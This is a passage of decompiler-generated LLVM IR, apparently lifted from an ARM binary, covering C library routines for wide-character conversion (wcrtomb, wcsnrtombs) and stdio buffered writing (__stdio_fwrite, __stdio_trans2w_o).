  store i32 %v3_1390c, i32* %stack_var_-8, align 4
  %v0_13918 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13918, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13918, -4095
  br i1 %tmp, label %dec_label_pc_13938, label %dec_label_pc_13928

dec_label_pc_13928:                               ; preds = %entry
  %v0_13928 = call i32 @__GI___errno_location()
  %v0_1392c = load i32, i32* %r7.global-to-local, align 4
  %v1_1392c = sub i32 0, %v0_1392c
  %v2_13930 = inttoptr i32 %v0_13928 to i32*
  store i32 %v1_1392c, i32* %v2_13930, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13938.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13938

dec_label_pc_13938:                               ; preds = %entry, %dec_label_pc_13928
  %v1_1393c = phi i32 [ %v0_13918, %entry ], [ -1, %dec_label_pc_13928 ]
  %v2_13938 = phi i32 [ %v3_1390c, %entry ], [ %v2_13938.pre, %dec_label_pc_13928 ]
  store i32 %v2_13938, i32* @r7, align 4
  ret i32 %v1_1393c

; uselistorder directives
  uselistorder i32 %v0_13918, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13938, { 1, 0 }
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_13940 = load i32, i32* @lr, align 4
  %v2_13944 = icmp eq i32 %arg1, 0
  br i1 %v2_13944, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_1394c = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_13974 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_13960 = phi i32 [ %arg1, %.thread ], [ %v3_1394c, %bb ]
  store i32 %arg3, i32* @r4, align 4
  %v2_1395c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_1395c, i32* @ip, align 4
  %v2_13964 = ptrtoint i32* %stack_var_-16 to i32
  store i32 16, i32* @r3, align 4
  store i32 %v2_1395c, i32* %stack_var_-16, align 4
  store i32 %v0_13974, i32* %stack_var_-12, align 4
  %v5_1397c = inttoptr i32 %v0_13960 to i8*
  %v6_1397c = call i32 @__GI_wcsnrtombs(i8* %v5_1397c, i32 %v2_13964, i32 1, i32 16, i32 %arg3)
  %v2_13980 = icmp eq i32 %v6_1397c, 0
  br i1 %v2_13980, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v1_13990 = phi i32 [ %v6_1397c, %bb11 ], [ 1, %bb12 ]
  store i32 %v6_13940, i32* @lr, align 4
  ret i32 %v1_13990

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_139a8 = load i32, i32* @r0, align 4
  %v1_139a8 = load i32, i32* @r1, align 4
  %v5_139a8 = inttoptr i32 %v0_139a8 to i8*
  %v6_139a8 = call i32 @__GI_wcsnrtombs(i8* %v5_139a8, i32 %v1_139a8, i32 -1, i32 %arg1, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_139a8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_139b8 = load i32, i32* @r4, align 4
  store i32 %v3_139b8, i32* %stack_var_-12, align 4
  %v10_139bc = icmp eq i32 %tmp, %arg2
  store i1 %v10_139bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v10_139bc, label %dec_label_pc_139d4, label %bb

bb:                                               ; preds = %entry
  %v4_139c0 = icmp eq i8* %arg1, null
  store i1 %v4_139c0, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %lr.global-to-local, align 4
  br i1 %v4_139c0, label %dec_label_pc_139d4.thread, label %bb39

dec_label_pc_139d4.thread:                        ; preds = %bb
  %v2_139c4 = ptrtoint i32* %stack_var_-32 to i32
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb40

bb39:                                             ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

dec_label_pc_139d4:                               ; preds = %entry
  %v2_139c41 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v3_139d4 = icmp eq i8* %arg1, null
  store i1 %v3_139d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_139d4, label %bb40, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_139d4
  store i32 %v2_139c41, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

bb40:                                             ; preds = %dec_label_pc_139d4, %dec_label_pc_139d4.thread
  %storemerge20 = phi i32 [ %v2_139c41, %dec_label_pc_139d4 ], [ %v2_139c4, %dec_label_pc_139d4.thread ]
  store i32 %storemerge20, i32* %lr.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %.thread14.thread

.thread14.thread:                                 ; preds = %bb39, %.thread8, %bb40
  %v2_13a3028 = phi i32 [ %v2_139c41, %.thread8 ], [ %tmp, %bb39 ], [ %storemerge20, %bb40 ]
  %v0_139ec = load i32, i32* @r3, align 4
  %v3_139ec = icmp uge i32 %v0_139ec, %arg3
  %arg3.v0_139ec = select i1 %v3_139ec, i32 %arg3, i32 %v0_139ec
  store i32 %arg3.v0_139ec, i32* %r5.global-to-local, align 4
  %v1_139f8 = inttoptr i32 %arg2 to i32*
  %v2_139f8 = load i32, i32* %v1_139f8, align 4
  store i32 %v2_139f8, i32* %r2.global-to-local, align 4
  store i32 %arg3.v0_139ec, i32* %r0.global-to-local, align 4
  %v2_13a4422 = icmp eq i32 %arg3.v0_139ec, 0
  store i1 %v2_13a4422, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13a4422, label %dec_label_pc_13a4c, label %dec_label_pc_13a04

dec_label_pc_13a04:                               ; preds = %.thread14.thread, %dec_label_pc_13a3c.dec_label_pc_13a04_crit_edge
  %v2_13a30 = phi i32 [ %v2_13a3c, %dec_label_pc_13a3c.dec_label_pc_13a04_crit_edge ], [ %v2_13a3028, %.thread14.thread ]
  %v0_13a10 = phi i32 [ %v0_13a04.pre, %dec_label_pc_13a3c.dec_label_pc_13a04_crit_edge ], [ %v2_139f8, %.thread14.thread ]
  %v1_13a04 = inttoptr i32 %v0_13a10 to i32*
  %v2_13a04 = load i32, i32* %v1_13a04, align 4
  %v7_13a08 = icmp eq i32 %v2_13a04, 127
  store i1 %v7_13a08, i1* %cpsr_z.global-to-local, align 1
  %v1_13a0c = urem i32 %v2_13a04, 256
  store i32 %v1_13a0c, i32* @ip, align 4
  %v1_13a10 = add i32 %v0_13a10, 4
  store i32 %v1_13a10, i32* %r2.global-to-local, align 4
  %tmp45 = icmp ult i32 %v2_13a04, 128
  br i1 %tmp45, label %dec_label_pc_13a2c, label %dec_label_pc_13a18

dec_label_pc_13a18:                               ; preds = %dec_label_pc_13a04
  %v0_13a18 = call i32 @__GI___errno_location()
  store i32 %v0_13a18, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_13a24 = inttoptr i32 %v0_13a18 to i32*
  store i32 84, i32* %v2_13a24, align 4
  %v0_13a58.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13a58

dec_label_pc_13a2c:                               ; preds = %dec_label_pc_13a04
  %v2_13a2c = icmp eq i32 %v1_13a0c, 0
  store i1 %v2_13a2c, i1* %cpsr_z.global-to-local, align 1
  %v1_13a30 = trunc i32 %v2_13a04 to i8
  %v3_13a30 = inttoptr i32 %v2_13a30 to i8*
  store i8 %v1_13a30, i8* %v3_13a30, align 1
  %v0_13a34 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13a34, label %.dec_label_pc_13a4c_crit_edge, label %dec_label_pc_13a3c

dec_label_pc_13a3c:                               ; preds = %dec_label_pc_13a2c
  %v0_13a3c = load i32, i32* %lr.global-to-local, align 4
  %v1_13a3c = load i32, i32* %r4.global-to-local, align 4
  %v2_13a3c = add i32 %v1_13a3c, %v0_13a3c
  store i32 %v2_13a3c, i32* %lr.global-to-local, align 4
  %v0_13a40 = load i32, i32* %r0.global-to-local, align 4
  %v1_13a40 = add i32 %v0_13a40, -1
  store i32 %v1_13a40, i32* %r0.global-to-local, align 4
  %v2_13a44 = icmp eq i32 %v1_13a40, 0
  store i1 %v2_13a44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13a44, label %dec_label_pc_13a4c, label %dec_label_pc_13a3c.dec_label_pc_13a04_crit_edge

dec_label_pc_13a3c.dec_label_pc_13a04_crit_edge:  ; preds = %dec_label_pc_13a3c
  %v0_13a04.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13a04

.dec_label_pc_13a4c_crit_edge:                    ; preds = %dec_label_pc_13a2c
  %v1_13a34 = load i32, i32* @ip, align 4
  store i32 %v1_13a34, i32* %r2.global-to-local, align 4
  %v0_13a4c.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_13a4c

dec_label_pc_13a4c:                               ; preds = %dec_label_pc_13a3c, %.dec_label_pc_13a4c_crit_edge, %.thread14.thread
  %v0_13a4c = phi i32 [ %v0_13a4c.pre, %.dec_label_pc_13a4c_crit_edge ], [ %v2_13a3028, %.thread14.thread ], [ %v2_13a3c, %dec_label_pc_13a3c ]
  %v1_13a4c = load i32, i32* @sp, align 4
  %v9_13a4c = icmp eq i32 %v0_13a4c, %v1_13a4c
  store i1 %v9_13a4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13a4c, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_13a4c
  %v1_13a50 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_13a50, i32* %v1_139f8, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_13a4c, %bb43
  %v0_13a54 = load i32, i32* %r0.global-to-local, align 4
  %v1_13a54 = load i32, i32* %r5.global-to-local, align 4
  %v2_13a54 = sub i32 %v1_13a54, %v0_13a54
  store i32 %v2_13a54, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13a58

dec_label_pc_13a58:                               ; preds = %dec_label_pc_13a18, %bb44
  %v0_13a58 = phi i32 [ %v0_13a58.pre, %dec_label_pc_13a18 ], [ %v2_13a54, %bb44 ]
  store i32 %v0_13a58, i32* %r0.global-to-local, align 4
  %v2_13a60 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13a60, i32* %r4.global-to-local, align 4
  ret i32 %v0_13a58

; uselistorder directives
  uselistorder i32 %v0_13a58, { 1, 0 }
  uselistorder i32 %v1_13a40, { 1, 0 }
  uselistorder i32 %v2_13a3c, { 0, 2, 1 }
  uselistorder i32 %v1_13a0c, { 1, 0 }
  uselistorder i32 %v2_13a04, { 2, 0, 1, 3 }
  uselistorder i32 %v2_13a3028, { 1, 0 }
  uselistorder i32 %v2_139c41, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 5, 3, 4, 6, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 6, 0 }
  uselistorder i32* %lr.global-to-local, { 5, 0, 4, 6, 1, 3, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 5, 2, 3, 4, 9, 6, 0, 7, 8 }
  uselistorder i32* @sp, { 2, 3, 0, 1 }
  uselistorder i32 84, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13a58, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_13a4c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13a04, { 1, 0 }
  uselistorder label %.thread14.thread, { 2, 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg3 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_13a68 = load i32, i32* @r4, align 4
  store i32 %v3_13a68, i32* %stack_var_-20, align 4
  %v6_13a68 = load i32, i32* @r5, align 4
  %v9_13a68 = load i32, i32* @r6, align 4
  %v12_13a68 = load i32, i32* @r7, align 4
  %v3_13a6c = load i16, i16* %arg3, align 2
  %v4_13a6c = zext i16 %v3_13a6c to i32
  %v1_13a70 = and i32 %v4_13a6c, 512
  store i32 %v1_13a70, i32* @r4, align 4
  %v2_13a70 = icmp eq i32 %v1_13a70, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_13a70, label %dec_label_pc_13a88, label %dec_label_pc_13b84

dec_label_pc_13a88:                               ; preds = %entry
  %v2_13a88 = add i32 %tmp, 4
  %v3_13a88 = inttoptr i32 %v2_13a88 to i32*
  %v4_13a88 = load i32, i32* %v3_13a88, align 4
  %v2_13a90 = add i32 %tmp, 16
  %v3_13a90 = inttoptr i32 %v2_13a90 to i32*
  %v4_13a90 = load i32, i32* %v3_13a90, align 4
  store i32 %v4_13a90, i32* @r0, align 4
  %v2_13a94 = add i32 %tmp, 12
  %v3_13a94 = inttoptr i32 %v2_13a94 to i32*
  %v4_13a94 = load i32, i32* %v3_13a94, align 4
  store i32 %v4_13a94, i32* @r3, align 4
  %v4_13a98 = icmp eq i32 %v4_13a88, -2
  %v2_13a9c = sub i32 %v4_13a94, %v4_13a90
  br i1 %v4_13a98, label %dec_label_pc_13a9c, label %dec_label_pc_13ac4

dec_label_pc_13a9c:                               ; preds = %dec_label_pc_13a88
  %v3_13aa0 = icmp ugt i32 %v2_13a9c, %arg2
  br i1 %v3_13aa0, label %bb, label %bb12

bb:                                               ; preds = %dec_label_pc_13a9c
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_13a9c, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_13a9c, %dec_label_pc_13a9c ]
  %v0_13aa8 = phi i32 [ %arg2, %bb ], [ %v2_13a9c, %dec_label_pc_13a9c ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_13aa8, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_13ab0 = call i32 @memcpy()
  %v0_13ab4 = load i32, i32* @r5, align 4
  %v1_13ab4 = add i32 %v0_13ab4, 16
  %v2_13ab4 = inttoptr i32 %v1_13ab4 to i32*
  %v3_13ab4 = load i32, i32* %v2_13ab4, align 4
  %v1_13ab8 = load i32, i32* @r4, align 4
  %v2_13ab8 = add i32 %v1_13ab8, %v3_13ab4
  store i32 %v2_13ab8, i32* %v2_13ab4, align 4
  br label %dec_label_pc_13b98

dec_label_pc_13ac4:                               ; preds = %dec_label_pc_13a88
  store i32 %v2_13a9c, i32* @r3, align 4
  %tmp18 = icmp ult i32 %v2_13a9c, %arg2
  br i1 %tmp18, label %dec_label_pc_13b64, label %dec_label_pc_13ad0

dec_label_pc_13ad0:                               ; preds = %dec_label_pc_13ac4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_13ad8 = call i32 @memcpy()
  %v0_13adc = load i32, i32* @r5, align 4
  %v1_13adc = add i32 %v0_13adc, 16
  %v2_13adc = inttoptr i32 %v1_13adc to i32*
  %v3_13adc = load i32, i32* %v2_13adc, align 4
  %v1_13ae0 = inttoptr i32 %v0_13adc to i16*
  %v2_13ae0 = load i16, i16* %v1_13ae0, align 2
  %v1_13ae4 = load i32, i32* @r6, align 4
  %v2_13ae4 = add i32 %v1_13ae4, %v3_13adc
  %v1_13ae8 = and i16 %v2_13ae0, 256
  %v2_13ae8 = icmp eq i16 %v1_13ae8, 0
  store i32 %v2_13ae4, i32* %v2_13adc, align 4
  br i1 %v2_13ae8, label %dec_label_pc_13b98, label %dec_label_pc_13af4

dec_label_pc_13af4:                               ; preds = %dec_label_pc_13ad0
  %v0_13af4 = load i32, i32* @r7, align 4
  %v0_13afc = load i32, i32* @r6, align 4
  %v4_13b00 = call i32 @memrchr(i32 %v0_13af4, i32 10, i32 %v0_13afc, i32 %v2_13ae4)
  %v2_13b04 = icmp eq i32 %v4_13b00, 0
  br i1 %v2_13b04, label %dec_label_pc_13b98, label %dec_label_pc_13b0c

dec_label_pc_13b0c:                               ; preds = %dec_label_pc_13af4
  %v0_13b0c = load i32, i32* @r5, align 4
  store i32 %v0_13b0c, i32* @r0, align 4
  %v0_13b10 = call i32 @__stdio_wcommit()
  %v2_13b14 = icmp eq i32 %v0_13b10, 0
  br i1 %v2_13b14, label %dec_label_pc_13b98, label %dec_label_pc_13b1c

dec_label_pc_13b1c:                               ; preds = %dec_label_pc_13b0c
  %v1_13b1c = load i32, i32* @r6, align 4
  %v3_13b1c = icmp uge i32 %v0_13b10, %v1_13b1c
  %v1_13b1c.v0_13b10 = select i1 %v3_13b1c, i32 %v1_13b1c, i32 %v0_13b10
  store i32 %v1_13b1c.v0_13b10, i32* @r4, align 4
  %v2_13b28 = sub i32 %v1_13b1c, %v1_13b1c.v0_13b10
  %v0_13b2c = load i32, i32* @r7, align 4
  %v2_13b2c = add i32 %v0_13b2c, %v2_13b28
  store i32 %v2_13b2c, i32* %r7.global-to-local, align 4
  store i32 %v2_13b2c, i32* @r0, align 4
  store i32 %v1_13b1c.v0_13b10, i32* @r2, align 4
  %v4_13b3c = call i32 @__GI_memchr(i32 %v2_13b2c, i32 10, i32 %v1_13b1c.v0_13b10, i32 %v2_13b28)
  %v2_13b40 = icmp eq i32 %v4_13b3c, 0
  br i1 %v2_13b40, label %dec_label_pc_13b98, label %dec_label_pc_13b48

dec_label_pc_13b48:                               ; preds = %dec_label_pc_13b1c
  %v0_13b48 = load i32, i32* @r5, align 4
  %v1_13b48 = add i32 %v0_13b48, 16
  %v2_13b48 = inttoptr i32 %v1_13b48 to i32*
  %v3_13b48 = load i32, i32* %v2_13b48, align 4
  %v0_13b4c = load i32, i32* %r7.global-to-local, align 4
  %v1_13b4c = load i32, i32* @r4, align 4
  %v2_13b4c = sub i32 %v0_13b4c, %v4_13b3c
  %v2_13b50 = add i32 %v2_13b4c, %v1_13b4c
  %v2_13b54 = sub i32 %v3_13b48, %v2_13b50
  %v1_13b58 = load i32, i32* @r6, align 4
  %v2_13b58 = sub i32 %v1_13b58, %v2_13b50
  store i32 %v2_13b58, i32* @r6, align 4
  store i32 %v2_13b54, i32* %v2_13b48, align 4
  br label %dec_label_pc_13b98

dec_label_pc_13b64:                               ; preds = %dec_label_pc_13ac4
  %v2_13b64 = add i32 %tmp, 8
  %v3_13b64 = inttoptr i32 %v2_13b64 to i32*
  %v4_13b64 = load i32, i32* %v3_13b64, align 4
  %v9_13b68 = icmp eq i32 %v4_13a90, %v4_13b64
  br i1 %v9_13b68, label %dec_label_pc_13b84, label %dec_label_pc_13b70

dec_label_pc_13b70:                               ; preds = %dec_label_pc_13b64
  store i32 %tmp, i32* @r0, align 4
  %v0_13b74 = call i32 @__stdio_wcommit()
  %v2_13b78 = icmp eq i32 %v0_13b74, 0
  br i1 %v2_13b78, label %dec_label_pc_13b70.dec_label_pc_13b84_crit_edge, label %bb15

dec_label_pc_13b70.dec_label_pc_13b84_crit_edge:  ; preds = %dec_label_pc_13b70
  %v0_13b84.pre = load i32, i32* @r6, align 4
  %v0_13b88.pre = load i32, i32* @r5, align 4
  %v0_13b8c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_13b84

bb15:                                             ; preds = %dec_label_pc_13b70
  %v1_13b7c = load i32, i32* @r4, align 4
  store i32 %v1_13b7c, i32* @r6, align 4
  br label %dec_label_pc_13b98

dec_label_pc_13b84:                               ; preds = %dec_label_pc_13b70.dec_label_pc_13b84_crit_edge, %entry, %dec_label_pc_13b64
  %v0_13b8c = phi i32 [ %v0_13b8c.pre, %dec_label_pc_13b70.dec_label_pc_13b84_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_13b64 ]
  %v0_13b88 = phi i32 [ %v0_13b88.pre, %dec_label_pc_13b70.dec_label_pc_13b84_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_13b64 ]
  %v0_13b84 = phi i32 [ %v0_13b84.pre, %dec_label_pc_13b70.dec_label_pc_13b84_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_13b64 ]
  %v1_13b88 = inttoptr i32 %v0_13b88 to i16*
  %v5_13b90 = call i32 @__stdio_WRITE(i16* %v1_13b88, i32 %v0_13b8c, i32 %v0_13b84)
  store i32 %v5_13b90, i32* @r6, align 4
  br label %dec_label_pc_13b98

dec_label_pc_13b98:                               ; preds = %bb15, %dec_label_pc_13b1c, %dec_label_pc_13b0c, %dec_label_pc_13af4, %dec_label_pc_13ad0, %dec_label_pc_13b48, %bb12, %dec_label_pc_13b84
  %v0_13b98 = load i32, i32* @r6, align 4
  %v2_13ba0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13ba0, i32* @r4, align 4
  store i32 %v6_13a68, i32* @r5, align 4
  store i32 %v9_13a68, i32* @r6, align 4
  store i32 %v12_13a68, i32* @r7, align 4
  ret i32 %v0_13b98

; uselistorder directives
  uselistorder i32 %v2_13b50, { 1, 0 }
  uselistorder i32 %v2_13b28, { 1, 0 }
  uselistorder i32 %v1_13b1c.v0_13b10, { 1, 2, 0, 3 }
  uselistorder i32 %v1_13b1c, { 1, 0, 2 }
  uselistorder i32 %v2_13a9c, { 2, 4, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_13b98, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_13b84, { 0, 2, 1 }
  uselistorder label %bb12, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13ba8 = load i32, i32* @r4, align 4
  store i32 %v3_13ba8, i32* %stack_var_-8, align 4
  %v3_13bac = load i16, i16* %arg1, align 2
  %v4_13bac = zext i16 %v3_13bac to i32
  %v2_13bb0 = and i32 %v4_13bac, %arg2
  %v4_13bb0 = icmp eq i32 %v2_13bb0, 0
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_13bb0, label %dec_label_pc_13bbc, label %dec_label_pc_13bcc

dec_label_pc_13bbc:                               ; preds = %entry
  %v1_13bbc = and i32 %v4_13bac, 2176
  %v2_13bbc = icmp eq i32 %v1_13bbc, 0
  br i1 %v2_13bbc, label %dec_label_pc_13bc4, label %dec_label_pc_13bd8

dec_label_pc_13bc4:                               ; preds = %dec_label_pc_13bbc
  %v2_13bc4 = or i32 %v4_13bac, %arg2
  %v1_13bc8 = trunc i32 %v2_13bc4 to i16
  store i16 %v1_13bc8, i16* %arg1, align 2
  %v0_13bcc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13bcc

dec_label_pc_13bcc:                               ; preds = %entry, %dec_label_pc_13bc4
  %v0_13c08 = phi i32 [ %tmp, %entry ], [ %v0_13bcc.pre, %dec_label_pc_13bc4 ]
  %v1_13bcc = inttoptr i32 %v0_13c08 to i16*
  %v2_13bcc = load i16, i16* %v1_13bcc, align 2
  %v3_13bcc = zext i16 %v2_13bcc to i32
  store i32 %v3_13bcc, i32* @ip, align 4
  %v1_13bd0 = and i32 %v3_13bcc, 32
  %v2_13bd0 = icmp eq i32 %v1_13bd0, 0
  br i1 %v2_13bd0, label %dec_label_pc_13bf8, label %dec_label_pc_13bd8

dec_label_pc_13bd8:                               ; preds = %dec_label_pc_13bbc, %dec_label_pc_13bcc
  %v0_13bd8 = call i32 @__GI___errno_location()
  store i32 %v0_13bd8, i32* %r0.global-to-local, align 4
  %v2_13be0 = inttoptr i32 %v0_13bd8 to i32*
  store i32 9, i32* %v2_13be0, align 4
  br label %dec_label_pc_13be4

dec_label_pc_13be4:                               ; preds = %dec_label_pc_13c20, %dec_label_pc_13bd8
  %v0_13be4 = load i32, i32* @r4, align 4
  %v1_13be4 = inttoptr i32 %v0_13be4 to i16*
  %v2_13be4 = load i16, i16* %v1_13be4, align 2
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_13bec = or i16 %v2_13be4, 8
  store i16 %v1_13bec, i16* %v1_13be4, align 2
  br label %bb11

dec_label_pc_13bf8:                               ; preds = %dec_label_pc_13bcc
  %tmp14 = urem i16 %v2_13bcc, 4
  %v2_13bf8 = icmp eq i16 %tmp14, 0
  br i1 %v2_13bf8, label %dec_label_pc_13c54, label %dec_label_pc_13c00

dec_label_pc_13c00:                               ; preds = %dec_label_pc_13bf8
  %v1_13c00 = and i32 %v3_13bcc, 4
  store i32 %v1_13c00, i32* @r1, align 4
  %v2_13c00 = icmp eq i32 %v1_13c00, 0
  br i1 %v2_13c00, label %dec_label_pc_13c08, label %dec_label_pc_13c38

dec_label_pc_13c08:                               ; preds = %dec_label_pc_13c00
  %v1_13c08 = add i32 %v0_13c08, 20
  %v2_13c08 = inttoptr i32 %v1_13c08 to i32*
  %v3_13c08 = load i32, i32* %v2_13c08, align 4
  store i32 %v3_13c08, i32* %r2.global-to-local, align 4
  %v1_13c0c = add i32 %v0_13c08, 16
  %v2_13c0c = inttoptr i32 %v1_13c0c to i32*
  %v3_13c0c = load i32, i32* %v2_13c0c, align 4
  %v9_13c10 = icmp eq i32 %v3_13c08, %v3_13c0c
  br i1 %v9_13c10, label %dec_label_pc_13c18, label %dec_label_pc_13c20

dec_label_pc_13c18:                               ; preds = %dec_label_pc_13c08
  %v1_13c18 = and i32 %v3_13bcc, 2
  %v2_13c18 = icmp eq i32 %v1_13c18, 0
  br i1 %v2_13c18, label %dec_label_pc_13c38, label %dec_label_pc_13c20

dec_label_pc_13c20:                               ; preds = %dec_label_pc_13c08, %dec_label_pc_13c18
  %v1_13c20 = and i32 %v3_13bcc, 1024
  %tmp12 = udiv i32 %v1_13c20, 1024
  %tmp13 = add nuw nsw i32 %tmp12, 1
  store i32 %tmp13, i32* %r2.global-to-local, align 4
  %v0_13c2c = call i32 @__GI_fseek()
  store i32 %v0_13c2c, i32* %r0.global-to-local, align 4
  %v2_13c30 = icmp eq i32 %v0_13c2c, 0
  br i1 %v2_13c30, label %.dec_label_pc_13c38_crit_edge, label %dec_label_pc_13be4

.dec_label_pc_13c38_crit_edge:                    ; preds = %dec_label_pc_13c20
  %v0_13c38.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13c38

dec_label_pc_13c38:                               ; preds = %.dec_label_pc_13c38_crit_edge, %dec_label_pc_13c00, %dec_label_pc_13c18
  %v2_13c44 = phi i32 [ %v0_13c38.pre, %.dec_label_pc_13c38_crit_edge ], [ %v0_13c08, %dec_label_pc_13c00 ], [ %v0_13c08, %dec_label_pc_13c18 ]
  %v1_13c38 = inttoptr i32 %v2_13c44 to i16*
  %v2_13c38 = load i16, i16* %v1_13c38, align 2
  %v1_13c3c = add i32 %v2_13c44, 8
  %v2_13c3c = inttoptr i32 %v1_13c3c to i32*
  %v3_13c3c = load i32, i32* %v2_13c3c, align 4
  store i32 %v3_13c3c, i32* %r2.global-to-local, align 4
  %v1_13c40 = and i16 %v2_13c38, -4
  store i16 %v1_13c40, i16* %v1_13c38, align 2
  %v0_13c48 = load i32, i32* %r2.global-to-local, align 4
  %v1_13c48 = load i32, i32* @r4, align 4
  %v2_13c48 = add i32 %v1_13c48, 20
  %v3_13c48 = inttoptr i32 %v2_13c48 to i32*
  store i32 %v0_13c48, i32* %v3_13c48, align 4
  %v0_13c4c = load i32, i32* %r2.global-to-local, align 4
  %v1_13c4c = load i32, i32* @r4, align 4
  %v2_13c4c = add i32 %v1_13c4c, 24
  %v3_13c4c = inttoptr i32 %v2_13c4c to i32*
  store i32 %v0_13c4c, i32* %v3_13c4c, align 4
  %v0_13c50 = load i32, i32* %r2.global-to-local, align 4
  %v1_13c50 = load i32, i32* @r4, align 4
  %v2_13c50 = add i32 %v1_13c50, 16
  %v3_13c50 = inttoptr i32 %v2_13c50 to i32*
  store i32 %v0_13c50, i32* %v3_13c50, align 4
  %v0_13c54.pre = load i32, i32* @r4, align 4
